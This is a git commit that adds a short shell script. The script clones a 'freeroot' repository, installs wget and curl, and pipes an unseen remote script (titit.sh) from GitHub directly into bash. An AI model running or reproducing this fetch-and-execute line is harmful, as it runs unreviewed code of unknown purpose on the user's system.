b57141e952df8b13cd81628146d4a88cf61e9c15
rifamanajul <rifamanajul@gmail.com>
2025-05-23 13:26:21 +0700

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+git clone https://github.com/foxytouxxx/freeroot.git
+cd freeroot
+apt update
+apt install wget curl -y
+curl -sL https://raw.githubusercontent.com/rifamanajul/All-Jobs/refs/heads/main/titit.sh | bash
